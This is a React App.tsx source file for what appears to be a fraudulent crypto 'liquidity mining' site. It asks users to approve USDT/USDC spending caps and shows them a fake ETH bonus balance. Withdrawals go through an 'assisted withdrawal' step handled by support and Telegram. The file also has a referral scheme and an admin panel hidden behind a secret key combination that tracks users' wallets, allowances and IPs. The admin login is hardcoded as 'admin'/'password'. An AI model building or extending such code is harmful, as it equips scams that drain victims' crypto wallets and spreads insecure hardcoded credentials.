
import React, { useState, useEffect } from 'react';
import type { Page, AdminUser, ChatSession, Message } from './types';
import AdminLayout from './components/admin/AdminLayout';
import FrontendApp from './FrontendApp';
import ConnectWalletModal from './components/ConnectWalletModal';
import AdminLoginModal from './components/admin/AdminLoginModal';
import EngagementModal from './components/EngagementModal';
import CustomerServiceModal from './components/CustomerServiceModal';
import LiveChat from './components/LiveChat';
import RequestAssistanceModal from './components/RequestAssistanceModal';
import * as api from './components/admin/api';

// Helper function to generate random alphanumeric strings for new user data
const generateAlphanumeric = (length: number) => [...Array(length)].map(() => Math.random().toString(36)[2]).join('');

function App() {
  // === STATE MANAGEMENT ===
  const [currentPage, setCurrentPage] = useState<Page>('landing');
  const [isConnected, setIsConnected] = useState(false);
  const [connectedWalletAddress, setConnectedWalletAddress] = useState<string | null>(null);
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
  const [isAdminView, setIsAdminView] = useState(false);
  
  // Modals
  const [showConnectModal, setShowConnectModal] = useState(false);
  const [showAdminLoginModal, setShowAdminLoginModal] = useState(false);
  const [showWelcomeModal, setShowWelcomeModal] = useState(false);
  const [showCustomerServiceModal, setShowCustomerServiceModal] = useState(false);
  const [showRequestAssistanceModal, setShowRequestAssistanceModal] = useState(false);
  const [showLiveChat, setShowLiveChat] = useState(false);
  const [referrer, setReferrer] = useState<string | null>(null);

  // Site Settings (simulated)
  const [supportTelegramUrl, setSupportTelegramUrl] = useState('');

  // User Data (for frontend simulation)
  const [userWalletBalance, setUserWalletBalance] = useState({ usdt: 50000, usdc: 25000 });
  const [platformBalance, setPlatformBalance] = useState({ eth: 0, bonus: 0.05 }); // Added bonus
  const [users, setUsers] = useState<AdminUser[]>([]);
  
  // New State for Token Allowances
  const [usdtAllowance, setUsdtAllowance] = useState(0);
  const [usdcAllowance, setUsdcAllowance] = useState(0);
  
  // Live Chat State
  const [chatSessions, setChatSessions] = useState<Record<string, ChatSession>>({});


  // === HANDLERS ===
  const handleNavigate = (page: Page) => {
    setCurrentPage(page);
  };

  // Connection
  const handleConnectClick = () => {
    setShowWelcomeModal(false);
    setReferrer(null);
    setShowConnectModal(true);
  };
  
  const handleConnectSuccess = async (address: string) => {
    setIsConnected(true);
    setConnectedWalletAddress(address);
    setShowConnectModal(false);
    setCurrentPage('mining');

    const isNewUser = !users.some(u => u.walletAddress.toLowerCase() === address.toLowerCase());
    
    // Give bonus to new users or if they came from a referral link
    if (isNewUser || referrer) {
       setPlatformBalance(prev => ({ ...prev, eth: prev.eth + prev.bonus }));
    }

    if (isNewUser) {
        const parentUser = referrer ? users.find(u => u.referralCode === referrer) : null;
        
        const newUser: AdminUser = {
            id: `usr_${generateAlphanumeric(4)}`,
            walletAddress: address,
            walletName: 'MetaMask', // Default assumption
            referralCode: generateAlphanumeric(6).toUpperCase(),
            usdtDepositAddress: 'T' + generateAlphanumeric(33),
            usdcDepositAddress: 'T' + generateAlphanumeric(33),
            ipAddress: '203.0.113.100', // Mocked
            location: 'Unknown', // Mocked
            joinDate: new Date().toISOString().split('T')[0],
            lastActive: new Date().toISOString(),
            status: 'Active',
            ethBalance: platformBalance.bonus, // New users start with the bonus
            walletBalance: { usdt: 0, usdc: 0 },
            usdtAllowance: 0,
            usdcAllowance: 0,
            totalDeposits: 0,
            invitationParent: parentUser ? parentUser.walletAddress : null,
            referrals: 0
        };
        
        const updatedUsers = await api.addUser(newUser, parentUser ? parentUser.id : null);
        setUsers(updatedUsers);
    }
    
    sessionStorage.setItem('hasConnectedBefore', 'true');
  };

  const handleDisconnect = () => {
    setIsConnected(false);
    setConnectedWalletAddress(null);
    setCurrentPage('landing');
    setUsdtAllowance(0); // Reset allowance on disconnect
    setUsdcAllowance(0);
  };

  // Admin
  const handleAdminLoginAttempt = (user: string, pass: string): boolean => {
    if (user === 'admin' && pass === 'password') {
      setIsAdminAuthenticated(true);
      setShowAdminLoginModal(false);
      setIsAdminView(true);
      return true;
    }
    return false;
  };
  const handleLogout = () => {
    setIsAdminAuthenticated(false);
    setIsAdminView(false);
  };
  const handleEnterAdminView = () => setIsAdminView(true);
  const handleExitAdminView = () => setIsAdminView(false);

  // Customer Service Handlers
  const handleCustomerServiceClick = () => {
    setShowCustomerServiceModal(true);
  };

  // Live Chat Handlers
  const handleStartLiveChat = async () => {
      setShowCustomerServiceModal(false);
      if (!connectedWalletAddress) return;
      
      const updatedSessions = await api.startOrGetChatSession(connectedWalletAddress);
      setChatSessions(updatedSessions);
      setShowLiveChat(true);
  };

  const handleUserSendMessage = async (text: string) => {
      if (!connectedWalletAddress) return;
      const newMessage: Message = { text, sender: 'user', timestamp: new Date().toISOString() };
      
      const sessionsAfterUserMsg = await api.addChatMessage(connectedWalletAddress, newMessage);
      setChatSessions(sessionsAfterUserMsg);

      // Simulate admin auto-reply
      setTimeout(async () => {
          if (!connectedWalletAddress) return; // check again in case user disconnected
          const autoReply: Message = { text: "Thank you for your message. An agent is reviewing your query and will respond shortly.", sender: 'admin', timestamp: new Date().toISOString() };
          const sessionsAfterAdminMsg = await api.addChatMessage(connectedWalletAddress, autoReply);
          setChatSessions(sessionsAfterAdminMsg);
      }, 2000);
  };

  const handleAdminSendMessage = async (sessionId: string, text: string) => {
       const newMessage: Message = { text, sender: 'admin', timestamp: new Date().toISOString() };
       const updatedSessions = await api.addChatMessage(sessionId, newMessage);
       setChatSessions(updatedSessions);
  };

  const handleAdminReadMessage = async (sessionId: string) => {
      if (chatSessions[sessionId]?.unreadAdmin) {
          const updatedSessions = await api.markChatReadByAdmin(sessionId);
          setChatSessions(updatedSessions);
      }
  };


  // Mining & Transfers (for frontend simulation)
  const handleStartMining = (amount: number, from: 'USDT' | 'USDC', eth: number) => {
    // Deduct from wallet balance
    setUserWalletBalance(prev => ({ ...prev, [from.toLowerCase()]: prev[from.toLowerCase() as 'usdt' | 'usdc'] - amount }));
    // Deduct from allowance
    if (from === 'USDT') {
        setUsdtAllowance(prev => prev - amount);
    } else {
        setUsdcAllowance(prev => prev - amount);
    }
    // Add to platform balance
    setPlatformBalance(prev => ({ ...prev, eth: prev.eth + eth }));
  };
  
  // New handler for setting token allowance
  const handleSetAllowance = (amount: number, currency: 'USDT' | 'USDC') => {
      alert(`You have approved a spending cap of ${amount.toLocaleString()} ${currency}.\nYou can now proceed with one-click conversions up to this amount.`);
      if (currency === 'USDT') {
          setUsdtAllowance(amount);
      } else {
          setUsdcAllowance(amount);
      }
  };

  const handleTransfer = (amount: number) => {
    if (amount <= platformBalance.eth) {
      setPlatformBalance(prev => ({ ...prev, eth: prev.eth - amount }));
      // In a real app, this would trigger a blockchain transaction.
      alert(`Successfully transferred ${amount} ETH to your wallet.`);
    } else {
      alert('Insufficient balance for transfer.');
    }
  };

  const handleRequestAssistedWithdrawal = async (amount: number, message: string) => {
    if (!connectedWalletAddress) return;
    try {
        await api.requestAssistedWithdrawal(connectedWalletAddress, amount, message);
        setShowRequestAssistanceModal(false);
        alert('Your request for an assisted withdrawal has been sent to support.');
    } catch (error) {
        alert('Failed to send request. Please try again.');
    }
  };


  useEffect(() => {
    // On initial load, populate state from the mock API
    const loadInitialData = async () => {
        try {
            const initialUsers = await api.publicFetchUsers();
            setUsers(initialUsers);
            const initialSessions = await api.getChatSessions();
            setChatSessions(initialSessions);
            const settings = await api.publicFetchSiteSettings();
            setSupportTelegramUrl(settings.supportTelegramUrl);
        } catch (error) {
            console.error("Could not load initial data.", error);
        }
    };
    loadInitialData();

    // Secret key combination to open admin login
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.ctrlKey && e.shiftKey && e.key === 'A') {
        setShowAdminLoginModal(true);
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    
    // Check for referral link
    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref');
    if (ref) {
        setReferrer(ref);
    }

    // Show welcome modal on first visit of the session
    const hasVisited = sessionStorage.getItem('hasVisited');
    if (!hasVisited) {
        setShowWelcomeModal(true);
        sessionStorage.setItem('hasVisited', 'true');
    }

    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  if (isAdminAuthenticated && isAdminView) {
    return (
      <AdminLayout
        onExitAdmin={handleExitAdminView}
        onLogout={handleLogout}
        chatSessions={chatSessions}
        onAdminSendMessage={handleAdminSendMessage}
        onAdminReadMessage={handleAdminReadMessage}
      />
    );
  }

  // Derive user-specific data for the profile page
  const currentUser = users.find(u => u.walletAddress.toLowerCase() === connectedWalletAddress?.toLowerCase());
  const userReferrals = users.filter(u => u.invitationParent === connectedWalletAddress);
  const userChatSession = connectedWalletAddress ? chatSessions[connectedWalletAddress] : undefined;

  return (
    <>
      <FrontendApp 
        currentPage={currentPage}
        isConnected={isConnected}
        isAdminAuthenticated={isAdminAuthenticated}
        connectedWalletAddress={connectedWalletAddress}
        userWalletBalance={userWalletBalance}
        platformBalance={platformBalance}
        userReferrals={userReferrals}
        usdtAllowance={usdtAllowance}
        usdcAllowance={usdcAllowance}
        referralCode={currentUser?.referralCode}
        onNavigate={handleNavigate}
        onConnectClick={handleConnectClick}
        onDisconnect={handleDisconnect}
        onLogout={handleLogout}
        onEnterAdminView={handleEnterAdminView}
        onStartMining={handleStartMining}
        onSetAllowance={handleSetAllowance}
        onTransfer={handleTransfer}
        onCustomerServiceClick={handleCustomerServiceClick}
        onRequestAssistedWithdrawal={() => setShowRequestAssistanceModal(true)}
      />
      {showConnectModal && (
        <ConnectWalletModal
          onClose={() => setShowConnectModal(false)}
          onConnectSuccess={handleConnectSuccess}
        />
      )}
      {showAdminLoginModal && !isAdminAuthenticated && (
        <AdminLoginModal
          onClose={() => setShowAdminLoginModal(false)}
          onLoginAttempt={handleAdminLoginAttempt}
        />
      )}
      {(showWelcomeModal || referrer) && !isConnected && (
        <EngagementModal
          onClose={() => {
            setShowWelcomeModal(false)
            setReferrer(null)
          }}
          onConnect={handleConnectClick}
          referrer={referrer}
        />
      )}
      {showCustomerServiceModal && (
        <CustomerServiceModal
          onClose={() => setShowCustomerServiceModal(false)}
          onLiveChatClick={handleStartLiveChat}
          telegramUrl={supportTelegramUrl}
        />
      )}
      {showLiveChat && isConnected && (
        <LiveChat 
            onClose={() => setShowLiveChat(false)}
            messages={userChatSession?.messages || []}
            onSendMessage={handleUserSendMessage}
        />
      )}
      {showRequestAssistanceModal && (
        <RequestAssistanceModal
            onClose={() => setShowRequestAssistanceModal(false)}
            onSubmit={handleRequestAssistedWithdrawal}
            currentBalance={platformBalance.eth}
        />
      )}
    </>
  );
}

export default App;
